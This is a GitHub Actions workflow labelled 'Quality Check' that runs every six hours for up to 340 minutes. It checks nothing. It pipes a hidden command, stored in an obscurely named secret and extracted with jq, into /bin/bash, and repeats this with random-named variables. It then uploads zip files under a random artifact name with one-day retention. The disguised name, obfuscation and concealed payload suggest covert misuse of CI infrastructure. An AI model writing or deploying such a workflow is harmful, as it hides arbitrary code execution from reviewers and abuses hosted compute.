name: Quality Check
on:
  workflow_dispatch:

  schedule:
    - cron: '0 0,6,12,18 * * *'
jobs:
  launch:
    runs-on: ubuntu-latest
    timeout-minutes: 340
    steps:
      - name: Checkout
        uses: actions/checkout@v4
        with:
          fetch-depth: 1
      - name: Do work
        env:
          ku850: ${{ secrets.ku850 }}
        run: |
          printf '%s' "$ku850" | jq -r .h392 | /bin/bash
          echo $wwe99 | jq -r .q262 | /bin/bash
          echo $zolbi6338 | jq -r .q84 | /bin/bash
          echo $s9415 | jq -r .lksq65098 | /bin/bash

      - name: Archive data
        uses: actions/upload-artifact@v4
        with:
          name: M6ZFbgpI
          path: "*.zip"
          retention-days: 1
